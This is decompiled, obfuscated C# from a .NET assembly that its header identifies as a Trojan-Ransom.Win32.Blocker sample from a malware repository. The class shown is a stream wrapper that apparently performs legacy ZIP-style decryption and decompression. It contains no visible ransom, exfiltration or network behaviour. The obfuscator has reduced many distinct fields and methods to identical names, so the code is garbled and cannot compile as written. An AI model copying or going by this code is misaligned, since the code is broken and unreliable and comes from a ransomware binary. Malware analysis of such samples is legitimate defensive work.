// Decompiled with JetBrains decompiler
// Type: ?1?.?36?
// Assembly: Server, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CCE56BF6-1478-4F80-8758-2108CD9D4C80
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jtre-eb5e0b099fc84d1d2c2bf7760be02cd5b14c59a9a1650c18de62d6fa9084bb85.exe

using \u003F1\u003F;
using System;
using System.IO;
using System.Runtime.CompilerServices;

namespace \u003F1\u003F
{
  internal class \u003F36\u003F : Stream
  {
    protected \u003F51\u003F \u003F1\u003F;
    protected byte[] \u003F1\u003F;
    protected int \u003F1\u003F;
    private byte[] \u003F15\u003F = new byte[1];
    protected Stream \u003F1\u003F;
    protected byte[] \u003F16\u003F;
    private uint[] \u003F1\u003F;

    public \u003F36\u003F(Stream _param1)
      : this(_param1, new \u003F51\u003F(), 4096)
    {
    }

    public \u003F36\u003F(Stream _param1, \u003F51\u003F _param2)
      : this(_param1, _param2, 4096)
    {
    }

    public \u003F36\u003F(Stream _param1, \u003F51\u003F _param2, int _param3)
    {
      this.\u003F1\u003F = _param1;
      this.\u003F1\u003F = _param2;
      try
      {
        this.\u003F1\u003F = (int) _param1.Length;
      }
      catch (Exception ex)
      {
        this.\u003F1\u003F = 0;
      }
      this.\u003F1\u003F = _param3 > 0 ? new byte[_param3] : throw new ArgumentOutOfRangeException(\u003F62\u003F.\u003F1\u003F(1204416743, 739949294, 1058591057));
    }

    [SpecialName]
    public override bool get_CanRead() => this.\u003F1\u003F.CanRead;

    [SpecialName]
    public override bool get_CanSeek() => this.\u003F1\u003F.CanSeek;

    [SpecialName]
    public override bool get_CanWrite() => this.\u003F1\u003F.CanWrite;

    [SpecialName]
    public override long get_Length() => (long) this.\u003F1\u003F;

    [SpecialName]
    public override long get_Position() => this.\u003F1\u003F.Position;

    [SpecialName]
    public override void set_Position(long _param1) => this.\u003F1\u003F.Position = _param1;

    public override void Flush() => this.\u003F1\u003F.Flush();

    public override long Seek(long _param1, SeekOrigin _param2) => this.\u003F1\u003F.Seek(_param1, _param2);

    public override void SetLength(long _param1) => this.\u003F1\u003F.SetLength(_param1);

    public override void Write(byte[] _param1, int _param2, int _param3) => this.\u003F1\u003F.Write(_param1, _param2, _param3);

    public override void WriteByte(byte _param1) => this.\u003F1\u003F.WriteByte(_param1);

    [SpecialName]
    public virtual int \u0020() => this.\u003F1\u003F.\u0008() ? 0 : 1;

    public override void Close() => this.\u003F1\u003F.Close();

    protected void \u003F15\u003F()
    {
      this.\u003F1\u003F = this.\u003F1\u003F.Read(this.\u003F1\u003F, 0, this.\u003F1\u003F.Length);
      if (this.\u003F16\u003F != null)
        goto label_3;
label_1:
      if (this.\u003F1\u003F <= 0)
        throw new ApplicationException(\u003F62\u003F.\u003F1\u003F(1252003846, 739949162, 1058591093));
      this.\u003F1\u003F.\u003F15\u003F(this.\u003F1\u003F, 0, this.\u003F1\u003F);
      return;
label_3:
      this.\u003F1\u003F(this.\u003F1\u003F, 0, this.\u003F1\u003F.Length);
      goto label_1;
    }

    public override int ReadByte() => this.Read(this.\u003F15\u003F, 0, 1) <= 0 ? -1 : (int) this.\u003F15\u003F[0] & (int) byte.MaxValue;

    public override int Read(byte[] _param1, int _param2, int _param3)
    {
      int num;
      while (true)
      {
        try
        {
          num = this.\u003F1\u003F.\u003F16\u003F(_param1, _param2, _param3);
        }
        catch (Exception ex)
        {
          throw new \u003F32\u003F(ex.ToString());
        }
        if (num <= 0)
        {
          if (!this.\u003F1\u003F.\u0007())
          {
            if (!this.\u003F1\u003F.\u0008())
            {
              if (this.\u003F1\u003F.\u0006())
                this.\u003F15\u003F();
              else
                goto label_11;
            }
            else
              goto label_8;
          }
          else
            goto label_6;
        }
        else
          break;
      }
      return num;
label_6:
      throw new \u003F32\u003F(\u003F62\u003F.\u003F1\u003F(22297113, 739949066, 1058591073));
label_8:
      return 0;
label_11:
      throw new InvalidOperationException(\u003F62\u003F.\u003F1\u003F(1124888884, 739949148, 1058591081));
    }

    public long \u003F1\u003F(long _param1)
    {
      if (_param1 < 0L)
        throw new ArgumentOutOfRangeException(\u003F62\u003F.\u003F1\u003F(1674762572, 739949288, 1058591041));
      int length = 2048;
      if (_param1 < (long) length)
        goto label_4;
label_2:
      byte[] buffer = new byte[length];
      return (long) this.\u003F1\u003F.Read(buffer, 0, buffer.Length);
label_4:
      length = (int) _param1;
      goto label_2;
    }

    protected byte \u003F16\u003F()
    {
      uint num = (uint) ((int) this.\u003F1\u003F[2] & (int) ushort.MaxValue | 2);
      return (byte) (num * (num ^ 1U) >> 8);
    }

    protected void \u003F1\u003F(byte[] _param1, int _param2, int _param3)
    {
      for (int index = _param2; index < _param2 + _param3; ++index)
      {
        _param1[index] ^= this.\u003F16\u003F();
        this.\u003F1\u003F(_param1[index]);
      }
    }

    protected void \u003F1\u003F(string _param1)
    {
      this.\u003F1\u003F = new uint[3]
      {
        305419896U,
        591751049U,
        878082192U
      };
      for (int index = 0; index < _param1.Length; ++index)
        this.\u003F1\u003F((byte) _param1[index]);
    }

    private uint \u003F1\u003F(uint _param1, byte _param2) => \u003F35\u003F.\u003F1\u003F[(IntPtr) (uint) (((int) _param1 ^ (int) _param2) & (int) byte.MaxValue)] ^ _param1 >> 8;

    protected void \u003F1\u003F(byte _param1)
    {
      this.\u003F1\u003F[0] = this.\u003F1\u003F(this.\u003F1\u003F[0], _param1);
      this.\u003F1\u003F[1] = this.\u003F1\u003F[1] + (uint) (byte) this.\u003F1\u003F[0];
      this.\u003F1\u003F[1] = (uint) ((int) this.\u003F1\u003F[1] * 134775813 + 1);
      this.\u003F1\u003F[2] = this.\u003F1\u003F(this.\u003F1\u003F[2], (byte) (this.\u003F1\u003F[1] >> 24));
    }
  }
}
